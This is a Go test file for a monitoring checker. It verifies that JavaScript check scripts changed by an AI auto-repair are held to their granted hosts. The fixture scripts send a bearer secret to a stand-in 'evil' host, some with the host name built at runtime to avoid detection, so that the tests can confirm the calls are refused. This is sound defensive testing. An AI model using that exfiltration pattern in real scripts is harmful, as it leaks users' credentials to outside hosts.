package checkjs

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/fclairamb/solidping/server/internal/checkers/checkerdef"
	checkconfig "github.com/fclairamb/solidping/server/internal/checkers/checkjs/config"
)

const repairTestSecret = "s3cr3t-token-value"

// secretSink records the Authorization headers it receives.
type secretSink struct {
	srv  *httptest.Server
	port string

	mu   sync.Mutex
	seen []string
}

func newSecretSink(t *testing.T) *secretSink {
	t.Helper()

	s := &secretSink{}
	s.srv = httptest.NewServer(http.HandlerFunc(func(_ http.ResponseWriter, req *http.Request) {
		s.mu.Lock()
		defer s.mu.Unlock()

		s.seen = append(s.seen, req.Header.Get("Authorization"))
	}))
	t.Cleanup(s.srv.Close)
	s.port = portOf(t, s.srv.Listener.Addr().String())

	return s
}

func (s *secretSink) hits() int {
	s.mu.Lock()
	defer s.mu.Unlock()

	return len(s.seen)
}

func (s *secretSink) sawSecret() bool {
	s.mu.Lock()
	defer s.mu.Unlock()

	return strings.Contains(strings.Join(s.seen, "\n"), repairTestSecret)
}

// repairedConfig is a script `repair: auto` applied, granted hosts.
func repairedConfig(script string, hosts []string) *JSConfig {
	env := map[string]string{"FIRE": "yes"}

	return &JSConfig{
		Script:  script,
		Env:     env,
		Secrets: map[string]string{"TOKEN": repairTestSecret},
		AI: &checkconfig.AIConfig{
			Repair: checkconfig.RepairAuto, RepairHosts: hosts,
			RepairGrant: checkconfig.RepairDigest(script, env),
		},
	}
}

// acmeScript calls the granted host (127.0.0.1, standing for acme.test) and,
// when env.FIRE is set, a second host with the secret.
func acmeScript(acmePort, evilTarget string) string {
	return `var auth = { headers: { Authorization: "Bearer " + secrets.TOKEN } };
var r = http.get("http://127.0.0.1:` + acmePort + `/", auth);
if (env.FIRE === "yes") { http.get(` + evilTarget + ` + "/", auth); }
return { status: r.error ? "down" : "up", output: { e: r.error } };`
}

// A scheduled run of an auto-applied version is held to its grant: the
// branch to another host (localhost, standing for evilco.test) fails the run
// with the refusal, and that host receives nothing.
func TestRepairGrantHoldsAScheduledRun(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name, target, named string
	}{
		{"literal host", `"http://localhost:PORT"`, "localhost"},
		{"host built at runtime", `"http://" + ["local", "host"].join("") + ":PORT"`, withheldHost},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			r := require.New(t)
			acme, evil := newSecretSink(t), newSecretSink(t)
			cfg := repairedConfig(acmeScript(acme.port, strings.ReplaceAll(tc.target, "PORT", evil.port)),
				[]string{"127.0.0.1"})

			result, err := (&JSChecker{}).Execute(context.Background(), cfg)
			r.NoError(err)
			r.Equal(checkerdef.StatusError, result.Status, result.Output)
			r.Equal(true, result.Output[OutputKeyRepairRefused])
			r.Contains(result.Output["error"], "a host its AI repair was not granted: "+tc.named)
			r.Zero(evil.hits(), "the refused host received nothing")
			r.True(acme.sawSecret(), "positive control: the granted host was reached")
		})
	}
}

// Positive control: a version calling only its granted host, through a URL
// built at runtime too, keeps running and the host gets the secret.
func TestRepairGrantLetsTheGrantedHostThrough(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	acme := newSecretSink(t)
	cfg := repairedConfig(acmeScript(acme.port, `"http://127.0." + "0.1:`+acme.port+`"`), []string{"127.0.0.1"})

	result, err := (&JSChecker{}).Execute(context.Background(), cfg)
	r.NoError(err)
	r.Equal(checkerdef.StatusUp, result.Status, result.Output)
	r.NotContains(result.Output, OutputKeyRepairRefused)
	r.Equal(2, acme.hits())
	r.True(acme.sawSecret())
}

// A granted config is held even with no `secrets` value: its env may carry
// a resolved `${param:…}` reference (spec 2026-10-26-02). The branch to the
// evilco sink is refused and the sink gets nothing.
func TestRepairGrantHoldsAScriptWithoutSecrets(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	acme, evil := newSecretSink(t), newSecretSink(t)
	script := `var auth = { headers: { Authorization: "Bearer " + env.TOKEN } };
var r = http.get("http://127.0.0.1:` + acme.port + `/", auth);
if (env.FIRE === "yes") { http.get("http://" + ["local", "host"].join("") + ":` + evil.port + `/", auth); }
return { status: r.error ? "down" : "up", output: { e: r.error } };`
	cfg := repairedConfig(script, []string{"127.0.0.1"})
	// The env as materializeConfig hands it over: the `${param:token}` the
	// grant was issued for, resolved to its value.
	cfg.AI.RepairGrant = checkconfig.RepairDigest(script, map[string]string{"FIRE": "yes", "TOKEN": "${param:token}"})
	cfg.Env = map[string]string{"FIRE": "yes", "TOKEN": repairTestSecret}
	cfg.Secrets = map[string]string{"TOKEN": ""}

	stored := cfg.GetConfig()
	stored["env"] = map[string]any{"FIRE": "yes", "TOKEN": "${param:token}"}

	result, err := (&JSChecker{}).Execute(WithStoredRepairHold(context.Background(), stored), cfg)
	r.NoError(err)
	r.Equal(checkerdef.StatusError, result.Status, result.Output)
	r.Equal(true, result.Output[OutputKeyRepairRefused])
	r.Zero(evil.hits(), "the refused host received nothing")
	r.True(acme.sawSecret(), "positive control: the granted host was reached")
}

// A config without a grant (a human-written script, or one whose edit
// dropped the grant) is not held: the same branch reaches its host.
func TestRepairGrantOnlyHoldsAGrantedScript(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	acme, evil := newSecretSink(t), newSecretSink(t)
	cfg := repairedConfig(acmeScript(acme.port, `"http://localhost:`+evil.port+`"`), []string{"127.0.0.1"})
	cfg.AI.RepairGrant, cfg.AI.RepairHosts = "", nil
	cfg.Secrets = map[string]string{"TOKEN": ""}

	_, held := cfg.RepairAllowlist()
	r.False(held)

	result, err := (&JSChecker{}).Execute(context.Background(), cfg)
	r.NoError(err)
	r.Equal(checkerdef.StatusUp, result.Status, result.Output)
	r.Equal(1, evil.hits(), "the new host is reachable")
}

// A grant left on a script it was not issued for (a write path that skipped
// NormalizeConfig) fails closed: the run is held to no host (spec 2026-10-25-01).
func TestRepairGrantStaleFailsClosed(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	acme, evil := newSecretSink(t), newSecretSink(t)
	cfg := repairedConfig(acmeScript(acme.port, `"http://localhost:`+evil.port+`"`), []string{"127.0.0.1"})
	cfg.Script += "\n// edited by alice"

	result, err := (&JSChecker{}).Execute(context.Background(), cfg)
	r.NoError(err)
	r.Equal(checkerdef.StatusError, result.Status, result.Output)
	r.Equal(true, result.Output[OutputKeyRepairRefused])
	r.Zero(acme.hits(), "not even the granted host")
	r.Zero(evil.hits())
}

// The hold decided on the stored config wins over the run's config, whose
// resolved references no grant was issued for (spec 2026-10-25-01).
func TestRepairGrantDecidedOnTheStoredConfig(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	acme, evil := newSecretSink(t), newSecretSink(t)
	stored := repairedConfig(acmeScript(acme.port, `"http://localhost:`+evil.port+`"`)+"\n// ${var:uuid}",
		[]string{"127.0.0.1"})
	storedMap := stored.GetConfig()

	resolved := repairedConfig(stored.Script, []string{"127.0.0.1"})
	resolved.AI.RepairGrant = stored.AI.RepairGrant
	resolved.Script = strings.Replace(stored.Script, "${var:uuid}", "0b8c6f0e-resolved", 1)

	result, err := (&JSChecker{}).Execute(WithStoredRepairHold(context.Background(), storedMap), resolved)
	r.NoError(err)
	r.Equal(checkerdef.StatusError, result.Status, result.Output)
	r.Equal(true, result.Output[OutputKeyRepairRefused])
	r.Contains(result.Output["error"], "a host its AI repair was not granted: localhost")
	r.Zero(evil.hits())
	r.True(acme.sawSecret(), "positive control: the granted host was reached")
}
